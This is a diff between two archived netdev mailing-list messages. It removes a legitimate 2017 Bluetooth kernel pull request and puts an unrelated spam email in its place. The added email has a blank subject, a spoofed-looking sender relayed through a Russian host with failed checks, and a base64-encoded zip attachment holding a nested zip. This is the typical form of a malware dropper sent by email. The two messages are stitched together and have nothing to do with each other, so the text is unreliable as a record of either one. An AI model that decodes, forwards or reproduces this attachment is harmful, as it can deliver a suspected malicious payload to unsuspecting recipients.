@@ -1,138 +1,75 @@
-From: Johan Hedberg <johan.hedberg@gmail.com>
-Subject: pull request: bluetooth-next 2017-05-23
-Date: Tue, 23 May 2017 17:11:20 -0700
-Message-ID: <20170524001120.GA3971@x1c.Skamania.guest>
+From: <bcohen@childrensnational.org>
+Subject: (unknown)
+Date: Wed, 24 May 2017 00:12:28 -0000
+Message-ID: <149558474808.6150.3671931549524153881@permonline.ru>
 Mime-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha1;
-        protocol="application/pgp-signature"; boundary="YZ5djTAD1cGYuMQK"
-Cc: linux-bluetooth@vger.kernel.org, netdev@vger.kernel.org
-To: davem@davemloft.net
+Content-Type: application/zip; name="07974248344583.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pf0-f173.google.com ([209.85.192.173]:35828 "EHLO
-        mail-pf0-f173.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753736AbdEXAL3 (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Tue, 23 May 2017 20:11:29 -0400
-Content-Disposition: inline
+Received: from 90.150.124.57.permonline.ru ([90.150.124.57]:35687 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S965509AbdEXAMc (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Tue, 23 May 2017 20:12:32 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-
---YZ5djTAD1cGYuMQK
-Content-Type: text/plain; charset=iso-8859-1
-Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
-
-Hi Dave,
-
-Here's the first Bluetooth & 802.15.4 pull request targeting the 4.13
-kernel release.
-
- - Bluetooth 5.0 improvements (Data Length Extensions and alternate PHY)
- - Support for new Intel Bluetooth adapter [[8087:0aaa]
- - Various fixes to ieee802154 code
- - Various fixes to HCI UART code
-
-Please let me know if there are any issues pulling. Thanks.
-
-Johan
-
----
-The following changes since commit 1fc4d180b3c6bed0e7f5160bcd553aec89594962:
-
-  Merge branch 'phy-marvell-cleanups' (2017-05-17 16:27:52 -0400)
-
-are available in the git repository at:
-
-  git://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.gi=
-t for-upstream
-
-for you to fetch changes up to 7dab5467647be42736dcabcd5d035c7b571f4653:
-
-  net: ieee802154: fix potential null pointer dereference (2017-05-23 20:12=
-:53 +0200)
-
-----------------------------------------------------------------
-Alexander Aring (1):
-      MAINTAINERS: update my mail address
-
-Dean Jenkins (1):
-      Bluetooth: hci_ldisc: Use rwlocking to avoid closing proto races
-
-Guodong Xu (1):
-      Bluetooth: hci_ll: Fix download_firmware() return when __hci_cmd_sync=
- fails
-
-Gustavo A. R. Silva (1):
-      net: ieee802154: fix potential null pointer dereference
-
-J=FCrg Billeter (1):
-      Bluetooth: btintel: Add MODULE_FIRMWARE entries for iBT 3.5 controlle=
-rs
-
-Lin Zhang (2):
-      net: ieee802154: remove explicit set skb->sk
-      net: ieee802154: fix net_device reference release too early
-
-Loic Poulain (1):
-      Bluetooth: btwilink: Fix unexpected skb free
-
-Marcel Holtmann (5):
-      Bluetooth: Set LE Suggested Default Data Length to maximum
-      Bluetooth: Enable LE Channel Selection Algorithm event
-      Bluetooth: Enable LE PHY Update Complete event
-      Bluetooth: Set LE Default PHY preferences
-      Bluetooth: Skip vendor diagnostic configuration for HCI User Channel
-
-Markus Elfring (3):
-      Bluetooth: Delete error messages for failed memory allocations in two=
- functions
-      ieee802154: ca8210: Delete an error message for a failed memory alloc=
-ation in ca8210_probe()
-      ieee802154: ca8210: Delete an error message for a failed memory alloc=
-ation in ca8210_skb_rx()
-
-Tedd Ho-Jeong An (1):
-      Bluetooth: Add support for Intel Bluetooth device 9460/9560 [8087:0aa=
-a]
-
-Tobias Regnery (2):
-      Bluetooth: hci_uart: fix kconfig dependency
-      Bluetooth: hci_nokia: select BT_HCIUART_H4
-
- MAINTAINERS                     |  4 ++--
- drivers/bluetooth/Kconfig       |  3 ++-
- drivers/bluetooth/btintel.c     |  2 ++
- drivers/bluetooth/btusb.c       |  4 ++++
- drivers/bluetooth/btwilink.c    |  1 -
- drivers/bluetooth/hci_ldisc.c   | 40 ++++++++++++++++++++++++++++++-----
- drivers/bluetooth/hci_ll.c      |  1 +
- drivers/bluetooth/hci_uart.h    |  1 +
- drivers/net/ieee802154/ca8210.c | 12 ++++-------
- include/net/bluetooth/hci.h     |  8 +++++++
- net/bluetooth/ecdh_helper.c     | 11 +++-------
- net/bluetooth/hci_core.c        | 46 ++++++++++++++++++++++++++++++++++++-=
-----
- net/ieee802154/socket.c         | 10 ++++-----
- 13 files changed, 107 insertions(+), 36 deletions(-)
-
---YZ5djTAD1cGYuMQK
-Content-Type: application/pgp-signature; name="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-
-iQIcBAEBAgAGBQJZJM+oAAoJECQj9vv5qNQSudIP/iej5TKN1QXWlRgFeJPy3f9d
-vsA0mNU8J5xK5B26N8V/9xhutu7vW7GIlS5xKu1I5vDGY9ZFw20qRXvYAtJXEuUF
-/5nQA2XpiTwVkwzvU/aoHZK7I4kuiWUJa0YEfeeLWVEf+P7APlkXPaDsokeesXbL
-IgRiGi3/KCvoOq0n/Ce8zBG2ehx0+qWLG/Bh/ItR9HZICKnjVZ9kVVLV16c195wt
-5zoPACippXiPSdV3KXQJTYsXX7vLA+3uWS6MIxqKo+F8VSptwtNfMDNNbDAQMCqB
-1wRKr6a1DKQADKnpVJ26SNpRclIwlL40XdaiaKNxDVzPJZPFndr8PomCV+lfq+BY
-vvdQbUCDVEDPdlkBKzrFpcA/i26JbZZ+HmZLZ6INIVbdL4rhswC58My+lJ3hIxuN
-E8v1ugOFeNaQ4Mb18y56j9CUYTtl52MXZDGq7eIPIjBbElGyTxlXFO+F/VjAmfwD
-vHwGLxj4SYQooFKDY4UZmECydKDiTUaQQzP5Dz51Xd7z+N9o7ONFo2YCvtSsQGtY
-2POxw6iqWLjn4RQm/dY7Paw662alH1854J2o3yB7xxEaYue6oQ4sKiaFnfkjkOLY
-GQeqf8D/rQ1+KPNirMa2/wGhsWUZA++7U7wzwPHXqqwJrg7w7cJVFwEOW+H4Ghex
-vM5bIAMwVbvwb598i+Cf
-=PJlE
------END PGP SIGNATURE-----
-
---YZ5djTAD1cGYuMQK--
+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
+AAAAAA==
